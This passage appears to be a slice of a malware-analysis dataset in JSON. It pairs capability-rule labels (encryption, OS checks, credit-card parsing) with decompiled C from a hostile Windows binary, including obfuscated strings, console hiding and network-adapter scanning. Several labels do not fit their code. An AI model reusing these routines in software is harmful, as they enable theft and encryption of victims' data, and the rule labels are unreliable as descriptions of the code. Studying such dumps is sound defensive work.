0x10;\n            var_8h = var_8h - 1;\n        } while (var_8h != 0);\n    }\n    if (7 < arg_8h) {\n        var_8h = arg_8h >> 3;\n        do {\n            uVar4 = *arg_ch * arg_14h;\n            uVar5 = uVar4 + var_4h;\n            uVar6 = (*arg_ch * arg_14h >> 0x20) + CARRY4(uVar4, var_4h) + CARRY4(uVar5, *arg_10h);\n            puVar1 = arg_10h + 1;\n            *arg_10h = uVar5 + *arg_10h;\n            uVar4 = arg_ch[1] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[1] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 2;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[2] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[2] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 3;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[3] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[3] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 4;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[4] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[4] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 5;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[5] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[5] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 6;\n            *puVar1 = uVar5 + *puVar1;\n            puVar1 = arg_ch + 7;\n            uVar4 = arg_ch[6] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[6] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar3 = arg_10h + 7;\n            *puVar2 = uVar5 + *puVar2;\n            arg_ch = arg_ch + 8;\n            uVar4 = *puVar1 * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            var_4h = (*puVar1 * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar3);\n            arg_10h = arg_10h + 8;\n            *puVar3 = uVar5 + *puVar3;\n            arg_8h = arg_8h - 8;\n            var_8h = var_8h - 1;\n        } while (var_8h != 0);\n    }\n    for (; arg_8h != 0; arg_8h = arg_8h - 1) {\n        uVar4 = *arg_ch * arg_14h;\n        uVar5 = uVar4 + var_4h;\n        var_4h = (*arg_ch * arg_14h >> 0x20) + CARRY4(uVar4, var_4h) + CARRY4(uVar5, *arg_10h);\n        *arg_10h = uVar5 + *arg_10h;\n        arg_ch = arg_ch + 1;\n        arg_10h = arg_10h + 1;\n    }\n    do {\n        *arg_10h = *arg_10h + var_4h;\n        var_4h = *arg_10h < var_4h;\n        arg_10h = arg_10h + 1;\n    } while (var_4h != 0);\n    return;\n}\n",
        "token_count": 3031
    },
    "004073b0": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_140h\n// WARNING: Variable defined which should be unmapped: var_144h\n\nuint __cdecl fcn.004073b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    int32_t iStack380;\n    uint var_174h;\n    uint32_t uStack372;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    int32_t aiStack344 [2];\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    int32_t aiStack272 [53];\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t *var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_20h = *(arg_8h + 0x18);\n    var_38h = *(arg_8h + 8);\n    var_24h = *(arg_8h + 0xc);\n    var_14h = *(arg_8h + 0x10);\n    var_10h = *(arg_8h + 0x14);\n    var_1ch = *(arg_8h + 8);\n    uVar5 = 0;\n    var_8h = *(arg_8h + 0x20);\n    var_ch = *(arg_8h + 0x1c);\n    var_18h = *(arg_8h + 0x24);\n    puVar7 = arg_ch + 2;\n    do {\n        (&var_138h)[uVar5] = CONCAT31(CONCAT21(CONCAT11(puVar7[-2], puVar7[-1]), *puVar7), puVar7[1]);\n        uVar5 = uVar5 + 1;\n        puVar7 = puVar7 + 4;\n    } while (uVar5 < 0x10);\n    uVar5 = 0;\n    do {\n        iVar8 = ((var_20h >> 0xb | var_20h << 0x15) ^ (var_20h << 7 | var_20h >> 0x19) ^\n                (var_20h >> 6 | var_20h << 0x1a)) + ((var_ch ^ var_8h) & var_20h ^ var_8h) + *(uVar5 + 0x422840) +\n                *(&var_138h + uVar5) + var_18h;\n        var_18h = var_10h + iVar8;\n        uVar6 = (var_1ch & var_24h | (var_24h | var_1ch) & var_14h) +\n                ((var_1ch >> 0xd | var_1ch << 0x13) ^ (var_1ch << 10 | var_1ch >> 0x16) ^\n                (var_1ch >> 2 | var_1ch << 0x1e)) + iVar8;\n        iVar8 = ((var_18h >> 0xb | var_18h * 0x200000) ^ (var_18h * 0x80 | var_18h >> 0x19) ^\n                (var_18h >> 6 | var_18h * 0x4000000)) + ((var_ch ^ var_20h) & var_18h ^ var_ch) + *(uVar5 + 0x422844) +\n                *(&var_134h + uVar5) + var_8h;\n        var_4h = var_14h + iVar8;\n        var_8h = (var_1ch & uVar6 | (var_1ch | uVar6) & var_24h) +\n                 ((uVar6 >> 0xd | uVar6 * 0x80000) ^ (uVar6 * 0x400 | uVar6 >> 0x16) ^ (uVar6 >> 2 | uVar6 * 0x40000000)\n                 ) + iVar8;\n        iVar8 = ((var_4h >> 0xb | var_4h * 0x200000) ^ (var_4h * 0x80 | var_4h >> 0x19) ^\n                (var_4h >> 6 | var_4h * 0x4000000)) + ((var_18h ^ var_20h) & var_4h ^ var_20h) + *(uVar5 + 0x422848) +\n                *(&var_130h + uVar5) + var_ch;\n        var_28h = var_24h + iVar8;\n        var_ch = (var_8h & uVar6 | (var_8h | uVar6) & var_1ch) +\n                 ((var_8h >> 0xd | var_8h * 0x80000) ^ (var_8h * 0x400 | var_8h >> 0x16) ^\n                 (var_8h >> 2 | var_8h * 0x40000000)) + iVar8;\n        iVar8 = ((var_28h >> 0xb | var_28h * 0x200000) ^ (var_28h * 0x80 | var_28h >> 0x19) ^\n                (var_28h >> 6 | var_28h * 0x4000000)) + ((var_18h ^ var_4h) & var_28h ^ var_18h) + *(uVar5 + 0x42284c) +\n                *(&var_12ch + uVar5) + var_20h;\n        var_1ch = var_1ch + iVar8;\n        var_20h = (var_ch & var_8h | (var_ch | var_8h) & uVar6) +\n                  ((var_ch >> 0xd | var_ch * 0x80000) ^ (var_ch * 0x400 | var_ch >> 0x16) ^\n                  (var_ch >> 2 | var_ch * 0x40000000)) + iVar8;\n        iVar8 = ((var_1ch >> 0xb | var_1ch * 0x200000) ^ (var_1ch * 0x80 | var_1ch >> 0x19) ^\n                (var_1ch >> 6 | var_1ch * 0x4000000)) + ((var_28h ^ var_4h) & var_1ch ^ var_4h) + *(uVar5 + 0x422850) +\n                *(&var_128h + uVar5) + var_18h;\n        var_18h = uVar6 + iVar8;\n        var_10h = ((var_20h | var_ch) & var_8h | var_20h & var_ch) +\n                  ((var_20h >> 0xd | var_20h * 0x80000) ^ (var_20h * 0x400 | var_20h >> 0x16) ^\n                  (var_20h >> 2 | var_20h * 0x40000000)) + iVar8;\n        iVar8 = ((var_18h >> 0xb | var_18h * 0x200000) ^ (var_18h * 0x80 | var_18h >> 0x19) ^\n                (var_18h >> 6 | var_18h * 0x4000000)) + ((var_28h ^ var_1ch) & var_18h ^ var_28h) + *(uVar5 + 0x422854)\n                + *(&var_124h + uVar5) + var_4h;\n        var_8h = var_8h + iVar8;\n        var_14h = ((var_10h | var_20h) & var_ch | var_10h & var_20h) +\n                  ((var_10h >> 0xd | var_10h * 0x80000) ^ (var_10h * 0x400 | var_10h >> 0x16) ^\n                  (var_10h >> 2 | var_10h * 0x40000000)) + iVar8;\n        iVar8 = ((var_8h >> 0xb | var_8h * 0x200000) ^ (var_8h * 0x80 | var_8h >> 0x19) ^\n                (var_8h >> 6 | var_8h * 0x4000000)) + ((var_1ch ^ var_18h) & var_8h ^ var_1ch) + *(uVar5 + 0x422858) +\n                *(&var_120h + uVar5) + var_28h;\n        var_ch = var_ch + iVar8;\n        var_24h = ((var_14h | var_10h) & var_20h | var_14h & var_10h) +\n                  ((var_14h >> 0xd | var_14h * 0x80000) ^ (var_14h * 0x400 | var_14h >> 0x16) ^\n                  (var_14h >> 2 | var_14h * 0x40000000)) + iVar8;\n        piVar1 = uVar5 + 0x42285c;\n        piVar2 = &var_11ch + uVar5;\n        uVar5 = uVar5 + 0x20;\n        iVar8 = ((var_ch >> 0xb | var_ch * 0x200000) ^ (var_ch * 0x80 | var_ch >> 0x19) ^\n                (var_ch >> 6 | var_ch * 0x4000000)) + ((var_18h ^ var_8h) & var_ch ^ var_18h) + *piVar1 + *piVar2 +\n                var_1ch;\n        var_20h = var_20h + iVar8;\n        var_1ch = ((var_14h | var_24h) & var_10h | var_14h & var_24h) +\n                  ((var_24h >> 0xd | var_24h * 0x80000) ^ (var_24h * 0x400 | var_24h >> 0x16) ^\n                  (var_24h >> 2 | var_24h * 0x40000000)) + iVar8;\n    } while (uVar5 < 0x40);\n    var_4h = 0x40;\n    do {\n        uVar4 = var_4h;\n        uVar3 = var_20h;\n        uVar5 = *(&uStack372 + (var_4h - 4));\n        uVar6 = *(&var_140h + var_4h);\n        var_28h = &var_140h + var_4h;\n        var_34h = ((uVar6 << 0xf | uVar6 >> 0x11) ^ (uVar6 << 0xd | uVar6 >> 0x13) ^ uVar6 >> 10) +\n                  ((uVar5 << 0xe | uVar5 >> 0x12) ^ (uVar5 >> 7 | uVar5 << 0x19) ^ uVar5 >> 3) + *(&iStack380 + var_4h)\n                  + *(aiStack344 + var_4h);\n        *(&var_138h + var_4h) = var_34h;\n        var_2ch = *(&uStack372 + uVar4);\n        iVar8 = ((uVar3 >> 0xb | uVar3 << 0x15) ^ (uVar3 << 7 | uVar3 >> 0x19) ^ (uVar3 >> 6 | uVar3 << 0x1a)) +\n                ((var_ch ^ var_8h) & uVar3 ^ var_8h) + *(var_4h + 0x422840) + var_34h + var_18h;\n        uVar6 = var_10h + iVar8;\n        var_10h = uVar6;\n        uVar4 = (var_24h & var_1ch | (var_24h | var_1ch) & var_14h) +\n                ((var_1ch >> 0xd | var_1ch << 0x13) ^ (var_1ch << 10 | var_1ch >> 0x16) ^\n                (var_1ch >> 2 | var_1ch << 0x1e)) + iVar8;\n        var_18h = uVar4;\n        uVar3 = var_28h[1];\n        uVar5 = uVar5 + ((uVar3 << 0xf | uVar3 >> 0x11) ^ (uVar3 << 0xd | uVar3 >> 0x13) ^ uVar3 >> 10) +\n                        ((var_2ch << 0xe | var_2ch >> 0x12) ^ (var_2ch >> 7 | var_2ch << 0x19) ^ var_2ch >> 3) +\n                        var_28h[-4];\n        *(&var_134h + var_4h) = uVar5;\n        iVar8 = ((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 * 0x80 | uVar6 >> 0x19) ^ (uVar6 >> 6 | uVar6 * 0x4000000))\n                + ((var_ch ^ var_20h) & uVar6 ^ var_ch) + *(var_4h + 0x422844) + uVar5 + var_8h;\n        uVar6 = var_14h + iVar8;\n        var_14h = uVar6;\n        var_8h = (var_18h & var_1ch | (uVar4 | var_1ch) & var_24h) +\n                 ((uVar4 >> 0xd | uVar4 * 0x80000) ^ (uVar4 * 0x400 | uVar4 >> 0x16) ^ (uVar4 >> 2 | uVar4 * 0x40000000)\n                 ) + iVar8;\n        var_30h = *(&var_16ch + var_4h);\n        var_2ch = ((var_30h << 0xe | var_30h >> 0x12) ^ (var_30h >> 7 | var_30h << 0x19) ^ var_30h >> 3) +\n                  ((var_34h << 0xf | var_34h >> 0x11) ^ (var_34h << 0xd | var_34h >> 0x13) ^ var_34h >> 10) +\n                  *(&var_14ch + var_4h) + var_2ch;\n        *(&var_130h + var_4h) = var_2ch;\n        iVar8 = ((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 * 0x80 | uVar6 >> 0x19) ^ (uVar6 >> 6 | uVar6 * 0x4000000))\n                + ((var_10h ^ var_20h) & uVar6 ^ var_20h) + *(var_4h + 0x422848) + var_2ch + var_ch;\n        uVar6 = var_24h + iVar8;\n        var_24h = uVar6;\n        uVar4 = ((var_8h | var_18h) & var_1ch | var_8h & var_18h) +\n                ((var_8h >> 0xd | var_8h << 0x13) ^ (var_8h << 10 | var_8h >> 0x16) ^ (var_8h >> 2 | var_8h << 0x1e)) +\n                iVar8;\n        var_ch = uVar4;\n        uVar3 = *(&var_168h + var_4h);\n        var_30h = ((uVar3 << 0xe | uVar3 >> 0x12) ^ (uVar3 >> 7 | uVar3 << 0x19) ^ uVar3 >> 3) +\n                  ((uVar5 * 0x8000 | uVar5 >> 0x11) ^ (uVar5 * 0x2000 | uVar5 >> 0x13) ^ uVar5 >> 10) +\n                  *(&var_148h + var_4h) + var_30h;\n        *(&var_12ch + var_4h) = var_30h;\n        iVar8 = ((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 * 0x80 | uVar6 >> 0x19) ^ (uVar6 >> 6 | uVar6 * 0x4000000))\n                + ((var_14h ^ var_10h) & uVar6 ^ var_10h) + *(var_4h + 0x42284c) + var_30h + var_20h;\n        uVar5 = var_1ch + iVar8;\n        var_1ch = uVar5;\n        uVar4 = ((uVar4 | var_8h) & var_18h | uVar4 & var_8h) +\n                ((uVar4 >> 0xd | uVar4 * 0x80000) ^ (uVar4 * 0x400 | uVar4 >> 0x16) ^ (uVar4 >> 2 | uVar4 * 0x40000000))\n                + iVar8;\n        var_20h = uVar4;\n        uVar6 = *(&var_164h + var_4h);\n        var_2ch = ((var_2ch << 0xf | var_2ch >> 0x11) ^ (var_2ch << 0xd | var_2ch >> 0x13) ^ var_2ch >> 10) +\n                  ((uVar6 << 0xe | uVar6 >> 0x12) ^ (uVar6 >> 7 | uVar6 << 0x19) ^ uVar6 >> 3) + *(&var_144h + var_4h) +\n                  uVar3;\n        *(&var_128h + var_4h) = var_2ch;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_14h ^ var_24h) & uVar5 ^ var_14h) + *(var_4h + 0x422850) + var_2ch + var_10h;\n        uVar5 = var_18h + iVar8;\n        var_18h = uVar5;\n        var_10h = (var_ch & uVar4 | (var_ch | uVar4) & var_8h) +\n                  ((uVar4 >> 0xd | uVar4 * 0x80000) ^ (uVar4 * 0x400 | uVar4 >> 0x16) ^\n                  (uVar4 >> 2 | uVar4 * 0x40000000)) + iVar8;\n        uVar3 = *(&var_160h + var_4h);\n        var_30h = ((var_30h << 0xf | var_30h >> 0x11) ^ (var_30h << 0xd | var_30h >> 0x13) ^ var_30h >> 10) +\n                  ((uVar3 << 0xe | uVar3 >> 0x12) ^ (uVar3 >> 7 | uVar3 << 0x19) ^ uVar3 >> 3) + *(&var_140h + var_4h) +\n                  uVar6;\n        *(&var_124h + var_4h) = var_30h;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_24h ^ var_1ch) & uVar5 ^ var_24h) + *(var_4h + 0x422854) + var_30h + var_14h;\n        uVar5 = var_8h + iVar8;\n        var_8h = uVar5;\n        var_14h = (var_10h & var_20h | (var_10h | var_20h) & var_ch) +\n                  ((var_10h >> 0xd | var_10h << 0x13) ^ (var_10h << 10 | var_10h >> 0x16) ^\n                  (var_10h >> 2 | var_10h << 0x1e)) + iVar8;\n        uVar6 = var_28h[-7];\n        iVar8 = ((uVar6 << 0xe | uVar6 >> 0x12) ^ (uVar6 >> 7 | uVar6 << 0x19) ^ uVar6 >> 3) +\n                ((var_2ch << 0xf | var_2ch >> 0x11) ^ (var_2ch << 0xd | var_2ch >> 0x13) ^ var_2ch >> 10) + uVar3 +\n                var_28h[1];\n        *(&var_120h + var_4h) = iVar8;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_1ch ^ var_18h) & uVar5 ^ var_1ch) + *(var_4h + 0x422858) + iVar8 + var_24h;\n        uVar5 = var_ch + iVar8;\n        var_ch = uVar5;\n        var_24h = (var_14h & var_10h | (var_14h | var_10h) & var_20h) +\n                  ((var_14h >> 0xd | var_14h << 0x13) ^ (var_14h << 10 | var_14h >> 0x16) ^\n                  (var_14h >> 2 | var_14h << 0x1e)) + iVar8;\n        uVar3 = var_28h[-6];\n        iVar8 = ((uVar3 << 0xe | uVar3 >> 0x12) ^ (uVar3 >> 7 | uVar3 << 0x19) ^ uVar3 >> 3) +\n                ((var_30h << 0xf | var_30h >> 0x11) ^ (var_30h << 0xd | var_30h >> 0x13) ^ var_30h >> 10) + var_34h +\n                uVar6;\n        *(&var_11ch + var_4h) = iVar8;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_18h ^ var_8h) & uVar5 ^ var_18h) + *(var_4h + 0x42285c) + iVar8 + var_1ch;\n        var_20h = var_20h + iVar8;\n        var_1ch = (var_14h & var_24h | (var_14h | var_24h) & var_10h) +\n                  ((var_24h >> 0xd | var_24h << 0x13) ^ (var_24h << 10 | var_24h >> 0x16) ^\n                  (var_24h >> 2 | var_24h << 0x1e)) + iVar8;\n        var_4h = var_4h + 0x20;\n    } while (var_4h < 0x100);\n    *(arg_8h + 8) = var_1ch + var_38h;\n    *(arg_8h + 0x10) = *(arg_8h + 0x10) + var_14h;\n    *(arg_8h + 0x14) = *(arg_8h + 0x14) + var_10h;\n    *(arg_8h + 0x1c) = *(arg_8h + 0x1c) + var_ch;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + var_24h;\n    *(arg_8h + 0x20) = *(arg_8h + 0x20) + var_8h;\n    *(arg_8h + 0x18) = *(arg_8h + 0x18) + var_20h;\n    *(arg_8h + 0x24) = *(arg_8h + 0x24) + var_18h;\n    return 0;\n}\n",
        "token_count": 6016
    },
    "00408040": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00408040(uint32_t *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_10h_00;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    if (arg_10h != 0) {\n        uVar2 = *arg_8h & 0x3f;\n        uVar1 = *arg_8h + arg_10h;\n        arg_10h_00 = 0x40 - uVar2;\n        *arg_8h = uVar1;\n        if (uVar1 < arg_10h) {\n            arg_8h[1] = arg_8h[1] + 1;\n        }\n        uVar1 = arg_10h;\n        if ((uVar2 != 0) && (arg_10h_00 <= arg_10h)) {\n            fcn.0040cbe0(arg_8h + uVar2 + 0x28, arg_ch, arg_10h_00);\n            uVar2 = fcn.004073b0(arg_8h, arg_8h + 10);\n            if (uVar2 != 0) {\n                return uVar2;\n            }\n            arg_ch = arg_ch + arg_10h_00;\n            uVar1 = arg_10h - arg_10h_00;\n        }\n        for (; arg_10h = uVar2,  0x3f < uVar1; uVar1 = uVar1 - 0x40) {\n            uVar2 = fcn.004073b0(arg_8h, arg_ch);\n            if (uVar2 != 0) {\n                return uVar2;\n            }\n            arg_ch = arg_ch + 0x40;\n            uVar2 = arg_10h;\n        }\n        if (uVar1 != 0) {\n            fcn.0040cbe0(arg_10h + 0x28 + arg_8h, arg_ch, uVar1);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 476
    },
    "00409b90": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409b90(uint32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint var_27h;\n    uint uStack39;\n    uint uStack35;\n    uint uStack31;\n    uint var_17h;\n    uint var_13h;\n    uint var_fh;\n    uchar var_bh;\n    uchar var_ah;\n    uchar var_9h;\n    uchar var_8h;\n    uchar var_7h;\n    uchar var_6h;\n    uint var_5h;\n    \n    uVar2 = 0;\n    var_27h = *0x424e20;\n    uStack39 = *0x424e24;\n    uStack35 = *0x424e28;\n    uStack31 = *0x424e2c;\n    var_17h = 0x71706c7e;\n    var_13h = 0x7e7a6d5c;\n    var_fh._0_2_ = 0x7a6b;\n    do {\n        var_27h._0_1_ = *0x424e20;\n        puVar1 = &var_27h + uVar2 + 1;\n        *puVar1 = *puVar1 ^ var_27h;\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 0x19);\n    var_fh._2_1_ = 0;\n    var_fh._3_1_ = 0x34;\n    var_5h._0_1_ = 0;\n    var_bh = 0x75;\n    var_7h = 0x33;\n    var_ah = 0x73;\n    var_9h = 0x65;\n    var_8h = 0x72;\n    var_6h = 0x32;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&var_bh, &var_27h + 1);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    if (arg_8h < 7) {\n    // switch table (7 cases) at 0x409c78\n        switch(*(*(arg_8h + 0x409c84) * 4 + 0x409c78)) {\n        case 0x409c35:\n            return 1;\n        default:\n            if (pcVar4 != NULL) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetConsoleWindow)(0);\n                (*pcVar4)(uVar3);\n            }\n            fcn.00409c90();\n            (*_sym.imp.KERNEL32.dll_Sleep)(99999);\n            return 1;\n        case 0x409c6e:\n            break;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 659
    },
    "0041e3e0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041e3e0(void)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    code *pcVar3;\n    code *pcVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    int32_t *piVar10;\n    int32_t pszPath;\n    int32_t iStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    uint ARG_0;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uchar var_1bh;\n    uchar var_1ah;\n    uchar var_19h;\n    uint var_18h;\n    uchar var_14h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    pcVar4 = _sym.imp.msvcrt.dll_malloc;\n    var_8h = 0x288;\n    piVar5 = (*_sym.imp.msvcrt.dll_malloc)(0x288);\n    pcVar3 = _sym.imp.IPHLPAPI.DLL_GetAdaptersInfo;\n    if (piVar5 != NULL) {\n        var_10h = piVar5;\n        iVar6 = (*_sym.imp.IPHLPAPI.DLL_GetAdaptersInfo)(piVar5, &var_8h);\n        if (iVar6 == 0x6f) {\n            (*_sym.imp.msvcrt.dll_free)(piVar5);\n            piVar5 = (*pcVar4)(var_8h);\n            var_10h = piVar5;\n            if (piVar5 == NULL) {\n                return;\n            }\n        }\n        iVar6 = (*pcVar3)(piVar5, &var_8h);\n        piVar10 = piVar5;\n        if (iVar6 == 0) {\n            if (piVar5 == NULL) {\n                return;\n            }\n            do {\n                if (piVar5[0x68] != 0x18) {\n                    var_20h._0_1_ = 0x14;\n                    var_18h._0_1_ = 0;\n                    var_20h._2_1_ = 0x2e;\n                    var_1ah = 0x2e;\n                    var_20h._1_1_ = 0x30;\n                    var_1bh = 0x30;\n                    var_ch = piVar5 + 0x6c;\n                    var_20h._3_1_ = 0x30;\n                    var_19h = 0x30;\n                    var_1ch = 0x2e;\n                    var_4h = piVar5;\n                    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(var_ch, &var_20h + 1);\n                    piVar10 = var_ch;\n                    if (iVar6 != 0) {\n                        pszPath = *var_ch;\n                        iStack80 = var_ch[1];\n                        iStack76 = var_ch[2];\n                        iStack72 = var_ch[3];\n                        (*_sym.imp.SHLWAPI.dll_PathRemoveExtensionA)(&pszPath);\n                        uVar8 = 0;\n                        ARG_0 = *0x424b00;\n                        uStack56 = *0x424b04;\n                        uStack52 = *0x424b08;\n                        uStack48 = *0x424b0c;\n                        var_28h = 0x170a150b;\n                        var_24h._0_2_ = 0x11;\n                        do {\n                            ARG_0._0_1_ = *0x424b00;\n                            puVar1 = &ARG_0 + uVar8 + 1;\n                            *puVar1 = *puVar1 ^ ARG_0;\n                            uVar8 = uVar8 + 1;\n                        } while (uVar8 < 0x14);\n                        var_24h._0_2_ = var_24h & 0xff;\n                        fcn.0040a0b0(&ARG_0 + 1, &pszPath);\n                        iVar6 = 0;\n                        do {\n                            var_18h._1_1_ = 0x4a;\n                            var_11h = 0;\n                            var_18h._2_1_ = 0x25;\n                            var_12h = 100;\n                            var_18h._3_1_ = 0x73;\n                            var_14h = 0x2e;\n                            var_13h = 0x25;\n                            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, &var_18h + 2, &pszPath, iVar6);\n                            iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(piVar10, &ARG_0);\n                            if (iVar7 != 0) {\n                                iVar7 = (*_sym.imp.msvcrt.dll_malloc)(0x1c);\n                                puVar9 = &ARG_0;\n                                do {\n                                    cVar2 = *puVar9;\n                                    *(puVar9 + (iVar7 - &ARG_0) + 4) = cVar2;\n                                    puVar9 = puVar9 + 1;\n                                } while (cVar2 != '\\0');\n                                (*_sym.imp.ntdll.dll_RtlInterlockedPushEntrySList)(*0x428f14, iVar7);\n                                *0x429348 = *0x429348 + 1;\n                                piVar10 = var_ch;\n                            }\n                            iVar6 = iVar6 + 1;\n                            piVar5 = var_4h;\n                        } while (iVar6 < 0xff);\n                    }\n                }\n                piVar5 = *piVar5;\n                piVar10 = var_10h;\n                var_4h = piVar5;\n            } while (piVar5 != NULL);\n        }\n        if (piVar10 != NULL) {\n            (*_sym.imp.msvcrt.dll_free)(piVar10);\n        }\n    }\n    return;\n}\n",
        "token_count": 1410
    },
    "00401010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401010(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    return arg_8h + in_ECX;\n}\n",
        "token_count": 42
    },
    "00401170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00401170(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 166
    },
    "004011ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.004011ad(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uchar *puVar2;\n    uint unaff_retaddr;\n    \n    uVar1 = in_EAX + (&stack0x00000004 + -in_EAX & 0xf) | -CARRY4(in_EAX, &stack0x00000004 + -in_EAX & 0xf);\n    if (uVar1 < 0x1000) {\n        *(&stack0x00000000 + -uVar1) = unaff_retaddr;\n        return;\n    }\n    puVar2 = &stack0x00000004;\n    do {\n        puVar2 = puVar2 + -0x1000;\n        uVar1 = uVar1 - 0x1000;\n    } while (0xfff < uVar1);\n    *(puVar2 + (-4 - uVar1)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 226
    },
    "004015a0": {
        "rules": [
